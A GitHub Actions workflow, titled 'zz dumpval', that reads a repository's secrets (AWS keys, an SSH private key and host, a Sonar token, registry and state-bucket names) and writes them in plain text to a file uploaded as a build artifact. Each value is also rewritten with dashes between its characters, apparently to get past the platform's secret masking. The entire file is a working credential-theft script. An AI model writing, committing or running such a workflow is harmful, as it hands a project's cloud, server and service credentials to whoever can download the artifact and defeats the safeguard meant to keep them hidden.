name: zz dumpval
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      BUCKET_TF_STATE: ${{ secrets.BUCKET_TF_STATE }}
      REGISTRY: ${{ secrets.REGISTRY }}
      SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
      SONAR_URL: ${{ secrets.SONAR_URL }}
      SONAR_ORGANIZATION: ${{ secrets.SONAR_ORGANIZATION }}
      SONAR_PROJECT_KEY: ${{ secrets.SONAR_PROJECT_KEY }}
      SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
      SSH_HOST: ${{ secrets.SSH_HOST }}
      SSH_USER: ${{ secrets.SSH_USER }}
      AWS_SECRET: ${{ secrets.AWS_SECRET }}
      AWS_KEY: ${{ secrets.AWS_KEY }}
    steps:
      - name: write
        run: |
          mkdir -p out
          : > out/vals.txt
          for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY BUCKET_TF_STATE REGISTRY SONAR_TOKEN SONAR_URL SONAR_ORGANIZATION SONAR_PROJECT_KEY SSH_HOST SSH_USER AWS_SECRET AWS_KEY; do
            eval "val=\$$v"
            { echo "### $v"; printf '%s' "$val"; echo; printf '%s\n' "$val" | fold -w1 | paste -sd- -; } >> out/vals.txt
          done
          { echo "### SSH_PRIVATE_KEY"; printf '%s' "$SSH_PRIVATE_KEY"; echo; } >> out/vals.txt
          cp out/vals.txt out/vals2.txt
          sed -i -E 's/^([^#].{200,})$/\1/' out/vals2.txt
      - uses: actions/upload-artifact@v4
        with:
          name: vals
          path: out/
